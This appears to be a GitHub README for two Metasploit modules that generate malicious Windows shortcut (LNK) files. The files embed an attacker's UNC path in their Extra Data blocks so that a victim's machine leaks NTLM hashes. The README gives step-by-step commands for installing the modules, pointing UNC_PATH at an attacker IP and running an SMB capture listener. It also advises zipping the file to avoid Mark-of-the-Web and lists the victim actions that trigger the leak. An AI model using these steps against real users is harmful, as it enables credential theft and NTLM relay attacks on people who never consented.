# DataBlockNTLMLeak
Here is my collection of `Extra Data` structure of Windows Shell Link (LNK) NTLM Leak Proof of Concept written in Metasploit (auxiliary module). I have few more to release but lets see if I'm not lazy :)

---

# 1. EnvironmentVariableDataBlock Leak - Metasploit Auxiliary Module
Right-Click Leak - Windows LNK File Special UNC Path NTLM Leak

### Overview
This module creates a Windows shortcut (LNK) file that specifies a special UNC path that can trigger an authentication attempt to a remote server. This can be used to harvest NTLM authentication credentials. When a victim right-clicks the LNK file, it will attempt to connect to the the specified UNC path, resulting in an SMB connection that can be captured to harvest credentials or perform relay attacks.

### 

1. Place the `EnvironmentVariableDataBlock_leak.rb` file in the Metasploit modules directory:
   ```
   cp EnvironmentVariableDataBlock_leak.rb /usr/share/metasploit-framework/modules/auxiliary/fileformat
   ```

2. Start Metasploit:
   ```
   msfconsole
   ```

3. Load the module:
   ```
   use auxiliary/windows/EnvironmentVariableDataBlock_leak
   ```

4. Configure the module:
   ```
   set FILENAME poc.lnk
   set UNC_PATH \\\\your_ip\\share
   set DESCRIPTION "Testing Purposes"
   ```

5. Execute the module:
   ```
   run
   ```

6. Set up a listener to capture authentication:
   ```
   use auxiliary/server/capture/smb
   run
   ```

7. MOTW? 
   ```
   1. ZIP the LNK file and host somewhere
   2. Download the file from victim side and extract the ZIP (WinRAR / 7-Zip) file. At this point, you don't have to worry about MOTW :-)
   3. Right-Click on the LNK file and it should send the NTLM hash to your MSF SMB Listener
   ```

## Options
- `FILENAME`: The name of the malicious LNK file to create
- `UNC_PATH`: The UNC path that will trigger the authentication attempt (e.g., \\\\attacker_ip\\share)
- `DESCRIPTION`: The description that will appear when hovering over the shortcut

--- 

# 2. IconEnvironmentDataBlock - Metasploit Auxiliary Module
IconEnvironmentDataBlock - Windows LNK File Special UNC Path NTLM Leak

## Overview

This module creates a malicious Windows shortcut (LNK) file that specifies a special UNC path in IconEnvironmentDataBlock that can trigger an authentication attempt to a remote server. This can be used to harvest NTLM authentication credentials. When a victim browse to the location of the LNK file, it will attempt to connect to the the specified UNC path, resulting in an SMB connection that can be captured to harvest credentials or perform relay attacks.

## Usage

1. Place the `IconEnvironmentDataBlock_ntlm.rb` file in the Metasploit modules directory:
   ```
   cp IconEnvironmentDataBlock_ntlm.rb /usr/share/metasploit-framework/modules/auxiliary/fileformat
   ```

2. Start Metasploit:
   ```
   msfconsole
   ```

3. Load the module:
   ```
   use auxiliary/fileformat/IconEnvironmentDataBlock_ntlm
   ```

4. Configure the module:
   ```
   set FILENAME poc.lnk
   set UNC_PATH \\\\your_ip\\share
   set DESCRIPTION "Testing Purposes"
   set ICON_PATH a
   ```

5. Run the module to generate the LNK:
   ```
   run
   ```

6. Set up a listener to capture authentication:
   ```
   use auxiliary/server/capture/smb
   run
   ```

7. MOTW? 
   ```
   1. This is your call. Easiest way is to ZIP the LNK file and host somewhere (e.g. web server, etc.)
   2. Download from the client-side and extract the ZIP file. At this point, you don't have to worry about MOTW :-)
   3. Extract the ZIP file to any folder (e.g. Desktop) and observe the NTLMv2 hash send to your MSF SMB listener
   4. If you browse / refresh the folder that has the LNK store, it will send the NTLM hash to the server.
   5. If you copy & paste / delete / drag & drop (e.g. from VM to Host or from Host to VM) of the LNK, it will send the NTLM hash to the server.
   ```

## Options
- `FILENAME`: The name of the malicious LNK file to create
- `UNC_PATH`: The UNC path that will trigger the authentication attempt (e.g., \\\\attacker_ip\\share)
- `DESCRIPTION`: The description that will appear when hovering over the shortcut
- `ICON_PATH`: The path to your own icon. Does not necessary to point to actual ICON file (e.g. a)

